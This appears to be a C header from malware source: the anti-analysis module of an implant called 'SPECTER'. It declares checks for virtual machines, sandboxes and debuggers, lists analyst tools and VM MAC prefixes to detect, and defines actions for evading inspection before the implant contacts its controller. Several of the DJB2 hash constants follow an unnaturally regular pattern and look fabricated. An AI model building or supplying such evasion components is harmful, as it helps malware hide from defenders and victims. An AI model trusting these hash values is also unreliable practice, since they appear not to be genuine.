/**
 * SPECTER Implant — Anti-Analysis Countermeasures Interface
 *
 * VM detection, sandbox detection, and debugger detection routines.
 * All checks use PEB-resolved APIs and inline assembly — no static
 * imports.  Run during implant_entry init before establishing comms.
 */

#ifndef ANTIANALYSIS_H
#define ANTIANALYSIS_H

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"

/* ------------------------------------------------------------------ */
/*  Analysis environment classification                                */
/* ------------------------------------------------------------------ */

typedef enum _ANALYSIS_TYPE {
    ANALYSIS_CLEAN      = 0,
    ANALYSIS_VM         = 1,
    ANALYSIS_SANDBOX    = 2,
    ANALYSIS_DEBUGGER   = 3,
} ANALYSIS_TYPE;

/* ------------------------------------------------------------------ */
/*  Configurable response action                                       */
/* ------------------------------------------------------------------ */

typedef enum _ANALYSIS_RESPONSE {
    AA_RESPONSE_EXIT          = 0,   /* Zero-fill context + terminate      */
    AA_RESPONSE_SLEEP_FOREVER = 1,   /* Infinite sleep loop                */
    AA_RESPONSE_DECOY         = 2,   /* Run benign payload                 */
    AA_RESPONSE_IGNORE        = 3,   /* Continue anyway (dev/testing)      */
} ANALYSIS_RESPONSE;

/* ------------------------------------------------------------------ */
/*  Analysis result structure                                          */
/* ------------------------------------------------------------------ */

#define AA_MAX_INDICATORS 8

typedef struct _ANALYSIS_RESULT {
    ANALYSIS_TYPE  type;             /* Detected environment type          */
    DWORD          confidence;       /* 0–100 confidence score             */
    DWORD          indicator_count;  /* Number of indicators hit           */
    DWORD          indicators[AA_MAX_INDICATORS]; /* Hit indicator IDs     */
} ANALYSIS_RESULT;

/* ------------------------------------------------------------------ */
/*  Anti-analysis context                                              */
/* ------------------------------------------------------------------ */

typedef struct _ANTIANALYSIS_CONFIG {
    ANALYSIS_RESPONSE response;      /* Action to take on detection        */
    DWORD             vm_threshold;  /* Confidence threshold for VM (0-100)*/
    DWORD             sb_threshold;  /* Confidence threshold for sandbox   */
    DWORD             dbg_threshold; /* Confidence threshold for debugger  */
    BOOL              check_vm;      /* Enable VM detection                */
    BOOL              check_sandbox; /* Enable sandbox detection           */
    BOOL              check_debugger;/* Enable debugger detection          */
} ANTIANALYSIS_CONFIG;

/* ------------------------------------------------------------------ */
/*  Indicator IDs (for result reporting)                               */
/* ------------------------------------------------------------------ */

/* VM indicators */
#define AA_IND_CPUID_HYPERVISOR    0x0001  /* CPUID hypervisor brand      */
#define AA_IND_VM_MAC_PREFIX       0x0002  /* Known VM MAC prefix         */
#define AA_IND_VM_PROCESS          0x0003  /* VM tools process running    */
#define AA_IND_VM_REGISTRY         0x0004  /* VM registry artifacts       */
#define AA_IND_SMBIOS_FIRMWARE     0x0005  /* SMBIOS firmware strings     */

/* Sandbox indicators */
#define AA_IND_TIMING_ACCEL        0x0010  /* Accelerated time detected   */
#define AA_IND_LOW_PROC_COUNT      0x0011  /* Suspiciously few processes  */
#define AA_IND_NO_USER_INPUT       0x0012  /* No recent user interaction  */
#define AA_IND_ANALYSIS_ARTIFACT   0x0013  /* Analysis tool artifacts     */
#define AA_IND_EMPTY_RECENT_DOCS   0x0014  /* No recent documents         */
#define AA_IND_LOW_RESOLUTION      0x0015  /* Low screen resolution       */

/* Debugger indicators */
#define AA_IND_PEB_DEBUGGED        0x0020  /* PEB->BeingDebugged set      */
#define AA_IND_DEBUG_PORT          0x0021  /* ProcessDebugPort active     */
#define AA_IND_RDTSC_DELTA         0x0022  /* RDTSC timing anomaly        */
#define AA_IND_HW_BREAKPOINTS      0x0023  /* DR0-DR3 set                 */

/* ------------------------------------------------------------------ */
/*  DJB2 hashes for resolved APIs                                      */
/* ------------------------------------------------------------------ */

#define HASH_WS2_32_DLL         0x492C19F7  /* "ws2_32.dll"              */
#define HASH_IPHLPAPI_DLL       0x738E2C41  /* "iphlpapi.dll"            */
#define HASH_GETADAPTERSINFO    0x50A2E01B  /* "GetAdaptersInfo"         */
#define HASH_GETSYSFIRMWARETABLE 0x6A4D3B52 /* "GetSystemFirmwareTable"  */
#define HASH_SHGETFOLDERPATH    0x7B5E4C63  /* "SHGetFolderPathA"        */
#define HASH_SHELL32_DLL        0x8C6F5D74  /* "shell32.dll"             */
#define HASH_FINDFIRSTFILE      0x9D708E85  /* "FindFirstFileA"          */
#define HASH_FINDCLOSE          0xAE819F96  /* "FindClose"               */

/* DJB2 hashes for VM-related process names */
#define HASH_VMTOOLSD_EXE       0xA5CD30B1  /* "vmtoolsd.exe"            */
#define HASH_VMWARETRAY_EXE     0x9BF81DA4  /* "vmwaretray.exe"          */
#define HASH_VBOXSERVICE_EXE    0xC4E21F67  /* "VBoxService.exe"         */
#define HASH_VBOXTRAY_EXE       0xD8A31B5E  /* "VBoxTray.exe"            */
#define HASH_QEMU_GA_EXE        0xE1F405C2  /* "qemu-ga.exe"             */

/* DJB2 hashes for analysis tool process names */
#define HASH_WIRESHARK_EXE      0xB2C41F90  /* "Wireshark.exe"           */
#define HASH_PROCMON_EXE        0xC3D52EA1  /* "Procmon.exe"             */
#define HASH_X64DBG_EXE         0xD4E63FB2  /* "x64dbg.exe"              */
#define HASH_X32DBG_EXE         0xE5F740C3  /* "x32dbg.exe"              */
#define HASH_IDA64_EXE          0xF60851D4  /* "ida64.exe"               */
#define HASH_OLLYDBG_EXE        0x071962E5  /* "ollydbg.exe"             */
#define HASH_PROCESSHACKER_EXE  0x182A73F6  /* "ProcessHacker.exe"       */

/* ------------------------------------------------------------------ */
/*  Known VM MAC address OUI prefixes (first 3 bytes)                  */
/* ------------------------------------------------------------------ */

#define VM_MAC_VMWARE_1     0x000C29  /* VMware                        */
#define VM_MAC_VMWARE_2     0x005056  /* VMware                        */
#define VM_MAC_VMWARE_3     0x000569  /* VMware                        */
#define VM_MAC_VBOX_1       0x080027  /* VirtualBox                    */
#define VM_MAC_HYPERV_1     0x001DD8  /* Hyper-V                       */
#define VM_MAC_HYPERV_2     0x0003FF  /* Hyper-V                       */
#define VM_MAC_QEMU_1       0x525400  /* QEMU/KVM                      */
#define VM_MAC_PARALLELS    0x001C42  /* Parallels                     */
#define VM_MAC_XEN          0x00163E  /* Xen                           */

/* ------------------------------------------------------------------ */
/*  CPUID hypervisor brand strings                                     */
/* ------------------------------------------------------------------ */

#define CPUID_HYPERVISOR_BIT  (1 << 31)  /* ECX bit 31 of CPUID leaf 1 */

/* ------------------------------------------------------------------ */
/*  Minimum process count threshold for sandbox check                  */
/* ------------------------------------------------------------------ */

#define AA_MIN_PROCESS_COUNT    30
#define AA_RDTSC_THRESHOLD      10000000  /* ~3ms at 3GHz               */
#define AA_USER_INPUT_TIMEOUT   300000    /* 5 minutes in milliseconds  */
#define AA_MIN_SCREEN_WIDTH     1024
#define AA_MIN_SCREEN_HEIGHT    768

/* ------------------------------------------------------------------ */
/*  API — anti-analysis checks                                         */
/* ------------------------------------------------------------------ */

/**
 * Run all enabled anti-analysis checks and return the result.
 * Checks run in order: debugger → VM → sandbox (debugger first since
 * it has the highest signal and fastest execution).
 *
 * cfg: anti-analysis configuration (thresholds, enabled checks, response)
 * result: output structure filled with detection details
 *
 * Returns ANALYSIS_CLEAN if no environment detected above threshold,
 * or the first detected type above its confidence threshold.
 */
ANALYSIS_TYPE antianalysis_check(IMPLANT_CONTEXT *ctx,
                                  const ANTIANALYSIS_CONFIG *cfg,
                                  ANALYSIS_RESULT *result);

/**
 * Execute the configured response action for a positive detection.
 * Called from implant_entry when antianalysis_check returns non-CLEAN.
 *
 * For AA_RESPONSE_EXIT: zero-fills implant context and terminates.
 * For AA_RESPONSE_SLEEP_FOREVER: enters infinite NtDelayExecution loop.
 * For AA_RESPONSE_DECOY: runs a benign computation loop then exits.
 * For AA_RESPONSE_IGNORE: returns immediately (no-op).
 */
void antianalysis_respond(IMPLANT_CONTEXT *ctx, ANALYSIS_RESPONSE response);

/* ------------------------------------------------------------------ */
/*  Individual check functions (can be called independently)           */
/* ------------------------------------------------------------------ */

/**
 * VM detection: CPUID hypervisor brand string, MAC prefixes, VM tool
 * processes.  Returns confidence 0–100.
 */
DWORD antianalysis_check_vm(IMPLANT_CONTEXT *ctx, ANALYSIS_RESULT *result);

/**
 * Sandbox detection: timing acceleration, process count, user input
 * recency, analysis tool processes, screen resolution.
 * Returns confidence 0–100.
 */
DWORD antianalysis_check_sandbox(IMPLANT_CONTEXT *ctx, ANALYSIS_RESULT *result);

/**
 * Debugger detection: PEB->BeingDebugged, NtQueryInformationProcess
 * ProcessDebugPort, RDTSC timing delta, hardware breakpoints DR0-DR3.
 * Returns confidence 0–100.
 */
DWORD antianalysis_check_debugger(IMPLANT_CONTEXT *ctx, ANALYSIS_RESULT *result);

/* ------------------------------------------------------------------ */
/*  Default configuration                                              */
/* ------------------------------------------------------------------ */

/**
 * Fill cfg with sensible defaults: all checks enabled, EXIT response,
 * thresholds at 50%.
 */
void antianalysis_default_config(ANTIANALYSIS_CONFIG *cfg);

/* ------------------------------------------------------------------ */
/*  Test support                                                       */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
void aa_test_set_cpuid_result(DWORD ecx_leaf1, DWORD ebx_leaf40, DWORD ecx_leaf40, DWORD edx_leaf40);
void aa_test_set_peb_debugged(BYTE val);
void aa_test_set_rdtsc_delta(QWORD delta);
void aa_test_set_process_count(DWORD count);
void aa_test_set_debug_registers(QWORD dr0, QWORD dr1, QWORD dr2, QWORD dr3);
void aa_test_set_mac_prefix(DWORD prefix);
void aa_test_set_smbios_vm(BOOL is_vm);
void aa_test_set_recent_docs_count(DWORD count);
#endif

#endif /* ANTIANALYSIS_H */
